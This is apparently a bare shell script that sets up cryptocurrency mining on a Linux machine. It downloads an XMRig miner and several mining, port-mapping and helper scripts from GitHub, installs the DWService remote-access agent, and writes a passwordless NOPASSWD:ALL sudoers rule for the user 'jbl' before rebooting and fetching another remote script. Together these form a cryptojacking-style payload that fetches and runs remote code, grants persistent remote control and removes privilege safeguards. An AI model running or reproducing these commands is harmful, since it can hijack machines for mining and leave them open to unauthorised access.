sudo apt install docker.io apache2 python python3 openvpn git unzip wget -y
sudo service apache2 start
cd ~/Documents/ && wget https://github.com/sanketdon/Mine/blob/main/xmrig-6.15.zip?raw=true 
cd ~/Documents/ && unzip xmrig-6.15.zip?raw=true && mv xmrig-6.15.zip?raw=true xmrig-6.15
cd /home/jbl/Documents/ && wget https://raw.githubusercontent.com/sanketdon/Mine/main/main2.py && chmod 777 main2.py
cd /home/jbl/Desktop/ && wget https://raw.githubusercontent.com/sanketdon/Mine/main/temp.sh && chmod +x temp.sh
cd /home/jbl/Desktop/ && wget https://raw.githubusercontent.com/sanketdon/Mine/main/mine.sh && chmod +x mine.sh
cd /home/jbl/Desktop/ && wget https://raw.githubusercontent.com/sanketdon/Mine/main/portmap.sh && chmod +x portmap.sh
cd /home/jbl/Downloads/ && wget https://www.dwservice.net/download/dwagent_x86.sh && chmod +x dwagent_x86.sh
cd /home/jbl/Desktop/ && wget https://raw.githubusercontent.com/R3verseIN/Mine/main/install_dwagent.sh && chmod +x install_dwagent.sh
sudo systemctl start docker
sudo systemctl enable docker
cat >> /etc/sudoers << EOF
jbl ALL=(ALL) NOPASSWD:ALL
EOF
sudo reboot now
wget https://raw.githubusercontent.com/R3verseIN/Mine2/main/main2.sh && chmod +x main2.sh
